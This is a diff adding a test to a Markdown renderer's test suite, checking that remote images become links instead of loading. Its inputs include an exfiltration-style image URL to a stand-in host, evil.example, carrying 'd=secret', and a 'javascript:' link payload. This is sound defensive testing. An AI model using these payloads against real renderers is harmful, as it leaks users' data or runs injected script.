@@ -21,6 +21,12 @@ describe("Markdown text (issue #85)", () => {
     expect(html).not.toContain("<img");
   });
 
+  it("never loads remote images, it shows a link instead", () => {
+    const html = render("![pic](https://evil.example/x.png?d=secret)");
+    expect(html).not.toContain("<img");
+    expect(html).toContain("<a ");
+  });
+
   it("drops javascript: links and opens real links in a new tab", () => {
     const bad = render("[x](javascript:alert(1))");
     expect(bad).not.toContain("javascript:");
